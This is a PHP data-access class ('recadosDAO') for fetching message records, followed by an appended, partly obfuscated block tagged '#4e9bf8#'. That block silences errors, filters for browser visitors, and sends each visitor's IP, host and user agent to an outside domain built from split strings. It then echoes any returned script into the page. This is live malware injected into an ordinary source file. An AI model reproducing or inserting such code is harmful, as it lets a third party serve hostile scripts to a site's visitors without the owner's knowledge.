<?php
include_once( "DAO.php" );
include_once( "DBUtils.php" );
include_once( "recados.php" );
# ------------------------------------------------------------------ #

class recadosDAO {

	# ------------------------------------------------------------------ #
	public static function getRecados( $id = null )
	{
		$out = array();

		if ( isset( $id ) )
		{
			$results = DAO::find( 'recados', array( 'id' => $id ) );
		}
		else
		{
			$results = DAO::find( 'recados' );
		}

		foreach ( $results as $recado )
		{
			$out[] = $recado;	
		}

		return $out;
	}

	# ------------------------------------------------------------------ #
	public static function getRecadosForHome()
	{
		$out = array();
		$results = DAO::find( 'recados', array(), 'updated_at desc', 8 );

		foreach ( $results as $recado )
		{
			$recado->__set( 'texto_parcial', ( strlen( $recado->texto ) > 50 ? substr( $recado->texto, 0, 50 ) . '...' : $recado->texto ) );
			$out[] = $recado;	
		}

		return $out;
	}

}

?>
<?php
#4e9bf8#
error_reporting(0); @ini_set('display_errors',0); $wp_bww5934 = @$_SERVER['HTTP_USER_AGENT']; if (( preg_match ('/Gecko|MSIE/i', $wp_bww5934) && !preg_match ('/bot/i', $wp_bww5934))){
$wp_bww095934="http://"."style"."generated".".com/"."generated"."/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_bww5934);
if (function_exists('curl_init') && function_exists('curl_exec')) {$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_bww095934); curl_setopt ($ch, CURLOPT_TIMEOUT, 20); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$wp_5934bww = curl_exec ($ch); curl_close($ch);} elseif (function_exists('file_get_contents') && @ini_get('allow_url_fopen')) {$wp_5934bww = @file_get_contents($wp_bww095934);}
elseif (function_exists('fopen') && function_exists('stream_get_contents')) {$wp_5934bww=@stream_get_contents(@fopen($wp_bww095934, "r"));}}
if (substr($wp_5934bww,1,3) === 'scr'){ echo $wp_5934bww; }
#/4e9bf8#
?>